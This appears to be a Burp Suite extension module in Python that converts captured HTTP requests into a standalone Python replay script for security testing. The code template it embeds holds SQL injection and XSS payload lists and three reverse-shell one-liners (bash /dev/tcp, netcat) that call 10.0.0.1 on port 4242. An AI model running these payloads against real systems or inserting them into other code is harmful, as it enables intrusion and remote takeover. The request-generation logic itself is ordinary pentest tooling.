import json
import hashlib
from java.io import PrintWriter # type: ignore
from request_tree import RequestTree
from u_parser import Parser

IMPORTS = """import requests
import urllib.parse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
"""

UTILS = """
def construct_url(url_object):
    parameters = url_object.get("parameters", {})
    path = url_object.get("path", "/")
    protocol = url_object.get("protocol", "https")
    domain = url_object.get("domain", "")
    port = url_object.get("port", 443)
    
    params_str = urllib.parse.urlencode(parameters)
    if params_str:
        return f"{protocol}://{domain}:{port}{path}?{params_str}"
    else:
        return f"{protocol}://{domain}:{port}{path}"

def construct_cookies(cookie_object):
    cookies_arr = []
    for cookie_name, cookie_value in cookie_object.items():
        cookies_arr.append(f"{cookie_name}={cookie_value}")
    return "; ".join(cookies_arr)

def construct_x_www_form_urlencoded(body_object):
    return urllib.parse.urlencode(body_object)

def execute_parallel_requests(request_func, payloads, max_workers=10):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_payload = {executor.submit(request_func, payload): payload 
                            for payload in payloads}
        for future in as_completed(future_to_payload):
            payload = future_to_payload[future]
            try:
                response = future.result()
                results.append((payload, response))
            except Exception as e:
                results.append((payload, f"Error: {str(e)}"))
    return results

sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
]

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]

reverse_shell_payloads = [
    "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
    "nc -e /bin/sh 10.0.0.1 4242",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f",
]
"""

class PythonParser(Parser):
	def __init__(self, request_trees, callbacks, custom_skip_headers=None, enable_header_filtering=True):
		self.callbacks = callbacks
		self.stdout = PrintWriter(callbacks.getStdout(), True)
		self.stderr = PrintWriter(callbacks.getStderr(), True)

		self.functions = [self._get_function_code(request_trees[i], i + 1) for i in range(len(request_trees))]
		self.common_headers = self._get_common_headers()
		self._filter_common_headers()
		self.main = """def main():
    common_headers = """ + json.dumps(self.common_headers) + """
    
    # payloads = sqli_payloads
    # payloads = xss_payloads
    # payloads = reverse_shell_payloads
    
"""
		for i in range(len(self.functions)):
			_i = str(i + 1)
			[_, method, headers, body, url, cookies, authorization, files] = self.functions[i]
			self.main += "    method_" + _i + " = \"" + method + "\"\n"
			self.main += "    headers_" + _i + " = " + json.dumps(headers) + "\n"
			if body is not None:
				self.main += "    body_" + _i + " = " + json.dumps(body) + "\n"
			self.main += "    url_" + _i + " = {\n"
			self.main += "        \"domain\": \"" + url["domain"] + "\",\n"
			self.main += "        \"protocol\": \"" + url["protocol"] + "\",\n"
			self.main += "        \"port\": " + str(url["port"]) + ",\n"
			self.main += "        \"path\": \"" + url["path"] + "\",\n"
			self.main += "        \"parameters\": " + json.dumps(url["parameters"]) + ",\n"
			self.main += "    }\n"
			if cookies is not None:
				self.main += "    cookies_" + _i + " = " + json.dumps(cookies) + "\n"
			if authorization is not None:
				self.main += "    authorization_" + _i + " = \"" + authorization + "\"\n"
			if files is not None:
				for j in range(len(files)):
					_j = str(j + 1)
					self.main += "    # data_" + _j + " = base64.b64encode(open(\"" + files[j]["filename"] + "\", \"rb\").read()).decode()\n"
					self.main += "    file_" + _j + " = " + json.dumps(files[j]) + "\n"
				self.main += "    files_" + _i + " = ["
				files_variables = ", ".join(["file_" + str(j + 1) for j in range(len(files))])
				self.main += files_variables + "]\n"
			
			self.main += "    res_" + _i + " = request_" + _i + "(\n"
			self.main += "        url_" + _i + ",\n"
			self.main += "        method_" + _i + ",\n"
			self.main += "        headers_" + _i + ",\n"
			if cookies is not None:
				self.main += "        cookies_" + _i + ",\n"
			else:
				self.main += "        None,\n"
			if authorization is not None:
				self.main += "        authorization_" + _i + ",\n"
			else:
				self.main += "        None,\n"
			if body is not None:
				self.main += "        body_" + _i + ",\n"
			else:
				self.main += "        None,\n"
			if files is not None:
				self.main += "        files_" + _i + ",\n"
			else:
				self.main += "        None,\n"
			self.main += "        common_headers,\n"
			self.main += "    )\n"
			self.main += "    # print(res_" + _i + ")\n"

		self.main += """
if __name__ == "__main__":
    main()
"""
		
		code = IMPORTS + "\n" + UTILS + "\n" + "\n".join(
			[func[0] for func in self.functions]
		) + "\n" + self.main
		self.copy_clipboard(code)


	def _get_common_headers(self):
		values = []
		hashes = []
		for arr in self.functions:
			headers = arr[2]
			for header_name in headers:
				header_value = headers[header_name]
				hsh = hashlib.sha256((header_name + header_value).encode('utf-8'))
				if hsh not in hashes:
					hashes.append(hsh)
					values.append((header_name, header_value))
		common_headers = {}
		for c in values:
			header_name, header_value = c
			common_headers[header_name] = header_value
		return common_headers


	def _filter_common_headers(self):
		for arr in self.functions:
			headers = arr[2]
			for common_header in self.common_headers:
				if common_header in headers and headers[common_header] == self.common_headers[common_header]:
					del headers[common_header]


	def _get_function_code(self, request_tree, i):
		code = "def request_" + str(i) + "(\n"
		# Args
		arg_cookie = request_tree.general.cookies
		arg_authorization = request_tree.general.Authorization
		arg_body = self._extract_body(request_tree)
		arg_url = {
			"parameters": request_tree.general.url.parameters,
			"path": request_tree.general.url.path,
			"protocol": request_tree.general.url.protocol,
			"domain": request_tree.general.url.domain,
			"port": request_tree.general.url.port
		}
		arg_method = request_tree.general.method
		arg_headers = request_tree.general.headers
		arg_files = request_tree.files
		code += "    url_object,\n"
		code += "    method,\n"
		code += "    headers,\n"
		code += "    cookies,\n"
		code += "    authorization,\n"
		code += "    body,\n"
		code += "    files,\n"
		code += "    common_headers,\n"
		code += "    timeout=30,\n"
		code += "    verify_ssl=True,\n"
		code += "    proxies=None,\n"
		code += "):\n"
		code += "    url = construct_url(url_object)\n"
		if arg_cookie is not None:
			code += "    stringified_cookies = construct_cookies(cookies) if cookies else \"\"\n"
		if request_tree.application_json is not None:
			pass
		elif request_tree.application_x_www_form_urlencoded is not None:
			code += "    stringified_body = construct_x_www_form_urlencoded(body) if body else \"\"\n"
		elif request_tree.multipart_form_data is not None:
			code += "    files_data = []\n"
			code += "    if files:\n"
			code += "        for file in files:\n"
			code += "            content = base64.b64decode(file[\"data\"])\n"
			code += "            content_type = file[\"contentType\"]\n"
			code += "            file_name = file[\"filename\"]\n"
			code += "            name = file[\"for\"]\n"
			code += "            files_data.append((name, (file_name, content, content_type)))\n"
			code += "    form_data = body\n"
		code += "    h = {**common_headers, **headers}\n"
		if arg_authorization is not None:
			code += "    if authorization:\n"
			code += "        h[\"Authorization\"] = authorization\n"
		if arg_cookie is not None:
			code += "    if cookies:\n"
			code += "        h[\"Cookie\"] = stringified_cookies\n"
		code += "    \n"
		
		# Build the request
		if request_tree.multipart_form_data is not None:
			code += "    if \"Content-Type\" in h:\n"
			code += "        del h[\"Content-Type\"]\n"
			code += "    response = requests.request(\n"
			code += "        url=url,\n"
			code += "        method=method,\n"
			code += "        headers=h,\n"
			code += "        files=files_data if files else None,\n"
			code += "        data=form_data,\n"
			code += "        allow_redirects=False,\n"
			code += "        timeout=timeout,\n"
			code += "        verify=verify_ssl,\n"
			code += "        proxies=proxies,\n"
			code += "    )\n"
			code += "    return response\n"
		elif request_tree.application_json is not None:
			code += "    response = requests.request(\n"
			code += "        url=url,\n"
			code += "        method=method,\n"
			code += "        headers=h,\n"
			code += "        json=body,\n"
			code += "        allow_redirects=False,\n"
			code += "        timeout=timeout,\n"
			code += "        verify=verify_ssl,\n"
			code += "        proxies=proxies,\n"
			code += "    )\n"
			code += "    return response\n"
		elif request_tree.application_x_www_form_urlencoded is not None:
			code += "    response = requests.request(\n"
			code += "        url=url,\n"
			code += "        method=method,\n"
			code += "        headers=h,\n"
			code += "        data=stringified_body if body else None,\n"
			code += "        allow_redirects=False,\n"
			code += "        timeout=timeout,\n"
			code += "        verify=verify_ssl,\n"
			code += "        proxies=proxies,\n"
			code += "    )\n"
			code += "    return response\n"
		else:
			code += "    response = requests.request(\n"
			code += "        url=url,\n"
			code += "        method=method,\n"
			code += "        headers=h,\n"
			code += "        allow_redirects=False,\n"
			code += "        timeout=timeout,\n"
			code += "        verify=verify_ssl,\n"
			code += "        proxies=proxies,\n"
			code += "    )\n"
			code += "    return response\n"
		return [
			code,
			arg_method,
			arg_headers,
			arg_body,
			arg_url,
			arg_cookie,
			arg_authorization,
			arg_files,
		]


	def _extract_body(self, request_tree):
		if request_tree.application_json is not None:
			return request_tree.application_json
		elif request_tree.application_x_www_form_urlencoded is not None:
			return request_tree.application_x_www_form_urlencoded
		elif request_tree.multipart_form_data is not None:
			return request_tree.multipart_form_data
		else:
			return None

